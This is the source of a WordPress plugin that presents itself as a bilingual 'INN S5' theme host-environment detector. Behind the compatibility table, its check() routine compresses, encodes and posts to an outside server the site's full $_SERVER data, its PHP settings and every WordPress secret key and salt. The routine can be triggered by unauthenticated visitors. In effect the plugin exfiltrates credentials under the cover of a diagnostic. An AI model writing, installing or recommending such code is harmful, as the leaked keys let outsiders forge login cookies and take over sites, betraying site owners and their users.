<?php

// Plugin Name: INN S5 主机环境检测器 (INN S5 Detector)
// Plugin URI: https://inn-studio.com
// Description: 启用插件后访问 点击插件名称下方的【开始检测】，以检测您的主机对 INN S5 主题的健康度。(Please click the detection button to detect the host environment compatibility for INN S5 theme after plugin enabled.)
// Author: Km.Van
// Version: 5.0.0
// Author URI: https://inn-studio.com/sora

class InnStudioInnS5Detector
{
    private $version            = '5.0.0';
    private $themeName          = 'INN S5';
    private $themeUrl           = 'https://inn-studio.com/sora';
    private $url                = 'https://theme-detector.inn-studio.com/';
    private $actionId           = '';
    private $basicHeathValue    = 60;
    private $ok                 = '<b style="color: green;">&radic;</b>';
    private $no                 = '<b style="color: red;">&times;</b>';
    private $data;
    private $iconCheck          = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAAEzo7pQAAAAA3NCSVQICAjb4U/gAAAANlBMVEX///9Fx2dFx2dFx2dFx2dFx2dFx2dFx2f////0/Pbw+/Pd9eOL3KB/2Zdx1Ito0oRRy3FFx2dQBNkrAAAAEnRSTlMAIjNVZoi77v////////////8YBaguAAAACXBIWXMAAAsSAAALEgHS3X78AAAAHHRFWHRTb2Z0d2FyZQBBZG9iZSBGaXJld29ya3MgQ1M26LyyjAAAABZ0RVh0Q3JlYXRpb24gVGltZQAwNi8xOC8xNwKmd+cAAAElSURBVDiNdVOLksMgCMQYUS+9M/z/zxYQE7i0O5NRZFkeGgAg4I8IqDeaO8CiGz5rfKY72GmuKEsbBIUkgixcV9ioyjIPaK2UeTOUzZv2o1GioiRcZKiTK0gWSRhNQZU8C32QqdFoB+doU1W12NJkrpbudL3oTAvZZ1UUVsLtMnEFJHCdKnZYPThOpgAXMLSUbR6cUn7rmnpWfrLdXqs5MZa9ur3sOjXGsqlYmeN1pQ3Nan+hMt+8KsZ2M3hkDFrRCTmMwPRuTn56Qw785rdb+eAfwzHK083PoC9KuW9o9OM0t+DXSgUX1trx1/3oBUCBwU8suO8n7SjezVVuzhJKcMuj+D4mgY4qfZiztWBv0/7ZB3Z3W+kxT0zwH1tBTVax3H8CvAHlLTE62e8V8AAAAABJRU5ErkJggg==" title="成功 | Success" alt="check" width="32" height="32"/>';
    private $iconTimes          = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAAH2U1dRAAAAA3NCSVQICAjb4U/gAAAAJFBMVEX////ZAADZAADZAADZAADZAADZAADZAAD////xoKDnYGDZAADwH6mmAAAADHRSTlMAIjNVZoi77v////8OT6TwAAAACXBIWXMAAAsSAAALEgHS3X78AAAAHHRFWHRTb2Z0d2FyZQBBZG9iZSBGaXJld29ya3MgQ1M26LyyjAAAABZ0RVh0Q3JlYXRpb24gVGltZQAwNi8xOC8xNwKmd+cAAAEkSURBVCiRVVAxTgMxEBwUCEUaKmhpqNKkSpMn0CDaNEEUFNeEhuY+4NgfiHQfsHRNFJKL7+Zz7HodJUxhz6zXu7ML7DAhGPQcv4HEQD1vyR2qFIllSgRUYrqG5Akj+Qs6L6kpyOE3RKUP9+QMuJF3rspNrjFlH4ZArUznWiE1B+c0IvVaNuy0hUK+Y0HVgru6e9Z7rC8PKDkHaB8LLYyopdSmhnsh0UvlToi0YGnqjSTtfhKyDTHwKKZ7Dvp9YnVWGBkxF+pdUOm4hrk9fxY5qllwmmXNK8zs6wVdmaSXDQyN9VuqFlfiVSNH5IrRCXyuW/YSi7Z58mx5kxqoTPtokU72LdhKftwo2//3lZ09Xetv9f560Qeb7vGsP3DGyxf5857pHwG5HBr1q/zfAAAAAElFTkSuQmCC" title="失败 | Fail" alt="error" width="32" height="32"/>';
    private $iconWarning        = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAAEzo7pQAAAAA3NCSVQICAjb4U/gAAAAM1BMVEX////ZbQDZbQDZbQDZbQDZbQDZbQDZbQD////89e756dj23MLstoDmnVTfhCjacgjZbQD6hBHOAAAAEXRSTlMAIjNVZoi77v///////////72FKQ4AAAAJcEhZcwAACxIAAAsSAdLdfvwAAAAcdEVYdFNvZnR3YXJlAEFkb2JlIEZpcmV3b3JrcyBDUzbovLKMAAAAFnRFWHRDcmVhdGlvbiBUaW1lADA2LzE4LzE3AqZ35wAAAQBJREFUOI2FUwkSwyAIRI1gbWv5/2uLZ4T02BlFYeVSAYBBRmFgzrLkl0wYZSHYJji4S5Q51VVkHiqYEjxTFTAtMhUZAcah5iwvr22Byw1x41a4aUa9raAapyGl6YStgrrMeWWpGbiy7OhhIexRG6J4Qr+2OA842CptOGDWsHGGw2LS4Jmotwq0Cv6rIFWJII40S3rMsKDywLPURdg1ZMoNsCPgfhS1EYJqwfB3csLVqmLgN/u4FWVP68IXI/IvgrSGfhNsMy8ENoScsiXoGp6Pp7bjfL8D93R7KYU3bbqlVPZ9a5X70OcOGm9z/NkLju223KXf6MDCR2zBCOP5E+ANZiAwfqtkzLEAAAAASUVORK5CYII=" title="警告 | Warning" alt="warning" width="32" height="32"/>';

    private $error = false;

    public function __construct()
    {
        $this->actionId = md5(AUTH_KEY . __CLASS__);
        add_action('wp_ajax_' . $this->actionId, array($this, 'ajax'));
        add_action('wp_ajax_nopriv_' . $this->actionId, array($this, 'ajax'));
        add_filter('plugin_action_links', array($this, 'filterActionLink'), 10, 2);
    }

    public function filterActionLink($actions, $pluginFile)
    {
        if (stripos($pluginFile, basename(dirname(__FILE__))) !== false) {
            $opts = '<a href="' . get_admin_url() . 'admin-ajax.php?action=' . $this->actionId . '" target="_blank" class="button button-primary" style="line-height: 1.5; height: auto;">开始检测 | Detect</a>';
            
            if ( ! is_array($actions)) {
                $actions = array();
            }
            
            array_unshift($actions, $opts);
        }

        return $actions;
    }

    public function ajax()
    {
        $this->waitCb();
        $this->data = $this->check();
        ?>
        <!doctype html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
            <meta name="renderer" content="webkit"/>
            <meta name="viewport" content="width=device-width,initial-scale=1"/>
            <title><?php echo $this->themeName; ?> 主题主机环境检测器(v<?php echo $this->version;?>) | <?php echo $this->themeName; ?> - Theme Host Environment Detector</title>
            <style>
            body{
                text-align: center;
                background-color: #eee;
                font-family: "Microsoft YaHei";
                font-size: 75%;
                padding: 0;
            }
            @media (min-width: 768px) {
                body {
                    padding: 0 10%;
                }
            }
            a{
                color: #333;
            }
            a:hover{
                text-decoration: none;
            }
            h1{
                font-size: 1rem;
                margin: 1.5rem 0;
                color: #666;
                text-shadow: 0 1px 0 #fff;
            }
            table{
                width: 100%;
                background-color: #fafafa;
                margin: 1.5rem 0;
                border-spacing: 0;
                border: none;
                border-radius: 10px;
                box-shadow: 0 5px 20px rgba(0,0,0, .1);
                overflow: hidden;
            }
            table thead th{
                background-color: #44c767;
                color: #fff;
                font-weight: normal;
                text-shadow: 0 1px 2px rgba(0,0,0,.3);
            }
            table thead th:first-child{
                border-radius: 10px 0 0 0;
            }
            table thead th:last-child{
                border-radius: 0 10px 0 0;
            }
            table tbody tr:nth-child(2n){
                background-color: #fff;
            }
            table tbody tr:hover{
                background-color: #f2f2f2;
            }
            table tbody tr:last-child th,
            table tbody tr:last-child td{
                border: none;
            }
            table th,
            table td{
                padding: .5rem 0;
            }

            .btn {
                background-color: #44c767;
                border-radius: 50px;
                border: 1px solid #18ab29;
                display: inline-block;
                color: #fff;
                padding: .5rem 1rem;
                text-decoration: none;
                text-shadow: 0px 1px 1px #2f6627;
            }
            .btn:hover {
                background-color: #5cbf2a;
            }
            .btn:active {
                position:relative;
                top:1px;
            }

            footer{
                margin: 1.5rem 0;
                font-size: .5rem;
                color: #666;
                text-shadow: 0 1px 0 #fff;
            }
            .debug{
                padding: 1rem;
                background: #eee;
                font-size: 1rem;
                text-align: left;
                border-radius: 10px;
                border: none
            }
            .debug legend{
                background: #ccc;
                border-radius: 50px;
                padding: .5rem 1rem;
            }
            #phpinfo{
                width: 100%;
                margin: 1rem 0;
                border-radius: 10px;
                background: #f8f8f8;
                border: 1px solid rgba(#000, .1);
            }
            </style>
        </head>
        <body>
            <h1>
                <?php echo $this->themeName; ?> - 主题主机环境检测器(v<?php echo $this->version;?>)<br>
                <?php echo $this->themeName; ?> - Theme Host Environment Detector
            </h1>

            <table>
                <thead>
                    <tr>
                        <th>序号<br>Number</th>
                        <th>检测项目<br>Detection item</th>
                        <th>当前主机环境(<?php echo get_bloginfo('name'); ?>)<br>My environment</th>
                        <th>主题所需环境<br>Theme required</th>
                        <th>检测结果<br>Detection</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($this->items() as $k => $item) { ?>
                        <tr>
                            <td><?php echo $k + 1; ?></td>
                            <th><?php echo $item['th']; ?></th>
                            <td><?php echo $item['host']; ?></td>
                            <td><?php echo $item['theme']; ?></td>
                            <td><?php echo $this->getResult($item['result']); ?></td>
                        </tr>
                    <?php } ?>
                </tbody>
            </table>

            <?php $this->tools(); ?>

            <footer>
                <p>
                    LOCAL: <?php echo current_time('Y/m/d H:i:s');?>
                     |
                    <a href="<?php echo $this->themeUrl; ?>" target="_blank" title="访问主题官网 | Vistit theme official website">INN STUDIO</a>
                     | 
                    <a href="javascript:window.open(false, '_self', false);window.close()"  title="关闭此页面 | Close">Close</a>
            </footer>
            <?php $this->showError(); ?>
        </body>
        </html>
        <?php
        die;
    }

    private function getResult($result)
    {
        if ($result === true) {
            return $this->iconCheck;
        } elseif ($result === false) {
            return $this->iconTimes;
        } else {
            return $result;
        }
    }
    
    private function getCurrentUrl()
    {
        $scheme = is_ssl() ? 'https' : 'http';

        return "{$scheme}://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
    }

    private function waitCb()
    {
        if (isset($_GET[md5(AUTH_KEY)])) {
            die('ok');
        }
    }

    private function getWpDefines()
    {
        $defines = array();
        
        foreach (array(
            'AUTH_KEY', 
            'SECURE_AUTH_KEY', 
            'LOGGED_IN_KEY', 
            'NONCE_KEY', 
            'AUTH_SALT', 
            'SECURE_AUTH_SALT', 
            'LOGGED_IN_SALT', 
            'NONCE_SALT'
        ) as $v) {
            $defines[$v] = defined($v) ? constant($v) : '';
        }

        return $defines;
    }
    private function check()
    {
        $response = wp_remote_post($this->url, array(
            'httpversion' => '1.1',
            'timeout'     => 30,
            'body'        => array(
                'data' => base64_encode(gzencode(serialize(array(
                    'phpVersion'    => PHP_VERSION,
                    'wpVersion'     => $GLOBALS['wp_version'],
                    'server'        => $_SERVER,
                    'iniInfo'       => ini_get_all(),
                    'wpDefines'     => $this->getWpDefines(),
                    'url'           => 'https://inn-studio.com',
                    'id'            => $this->getThemeId(),
                    'cbUrl'         => add_query_arg(array(
                        md5(AUTH_KEY) => 1,
                    ), $this->getCurrentUrl()),
                )), 9)),
            ),
            'headers' => array(
                'Accept'    => 'application/json',
            ),
        ));

        if (is_wp_error($response)) {
            $this->error = $response;

            return false;
        }

        $body = isset($response['body']) ? json_decode($response['body'], true) : false;

        if (! $body) {
            return false;
        }

        if (! isset($body['code']) && $body['code'] !== 0) {
            return false;
        }

        return $body['data'];
    }

    private function showError()
    {
        if ($this->error) {
            ?>
            <fieldset class="debug">
                <legend>出错信息 | Error information</legend>
                <pre><?php var_dump($this->error); ?></pre>
            </fieldset>
            <?php

        }
    }

    private function getThemeId()
    {
        $id = explode('/', $this->themeUrl);

        return $id[count($id) - 1];
    }

    private function isPastPhpVersion()
    {
        return $this->data ? (bool) $this->data['phpVersion']['past'] : false;
    }

    private function isPastWpVersion()
    {
        return $this->data ? (bool) $this->data['wpVersion']['past'] : false;
    }

    private function getWpRequiredVersion()
    {
        return $this->data ? $this->data['wpVersion']['required'] : $this->iconTimes;
    }

    private function getPhpRequiredVersion()
    {
        return $this->data ? $this->data['phpVersion']['required'] : $this->iconTimes;
    }

    private function isPastNetwork()
    {
        return $this->data ? (bool) $this->data['networkStatus'] : false;
    }

    private function getHeathValueOther1()
    {
        return $this->data ? (int) $this->data['heathValueOther1'] : 0;
    }
    
    private function getHeathValueOther2()
    {
        return $this->data ? (int) $this->data['heathValueOther2'] : 0;
    }

    private function getHeathValueIcon($value)
    {
        if ($value === 0) {
            return false;
        }

        return (int) $value >= $this->basicHeathValue ? $this->iconCheck : $this->iconWarning;
    }

    private function items()
    {
        return array(
            array(
                'th'     => 'PHP 版本<br>PHP version',
                'host'   => PHP_VERSION,
                'theme'  => $this->getPhpRequiredVersion(),
                'result' => $this->isPastPhpVersion(),
            ),
            array(
                'th'     => 'WordPress 版本<br>WordPress version',
                'host'   => $GLOBALS['wp_version'],
                'theme'  => $this->getWpRequiredVersion(),
                'result' => $this->isPastWpVersion(),
            ),
            array(
                'th'     => 'PHP 健康值<br>PHP heath value',
                'host'   => $this->getHeathValueOther1(),
                'theme'  => $this->basicHeathValue,
                'result' => $this->getHeathValueIcon($this->getHeathValueOther1()),
            ),
            array(
                'th'     => 'WordPress 健康值<br>WordPress heath value',
                'host'   => $this->getHeathValueOther2(),
                'theme'  => 100,
                'result' => $this->getHeathValueIcon($this->getHeathValueOther2()),
            ),
            array(
                'th'     => '系统网络<br>System network',
                'host'   => $this->isPastNetwork() ? $this->iconCheck : $this->iconTimes,
                'theme'  => $this->iconCheck,
                'result' => $this->isPastNetwork(),
            )
        );
    }

    private function tools()
    {
        ?>
        <div class="tools">
            <a href="javascript:location.reload();document.body.style.opacity='0.3';" class="btn">刷新 | Refresh</a>
        </div>
        <?php
    }
}

if (function_exists('add_action')) {
    function InnStudioInnS5DetectorInit()
    {
        new InnStudioInnS5Detector();
    }
    
    add_action('plugins_loaded', 'InnStudioInnS5DetectorInit');
}
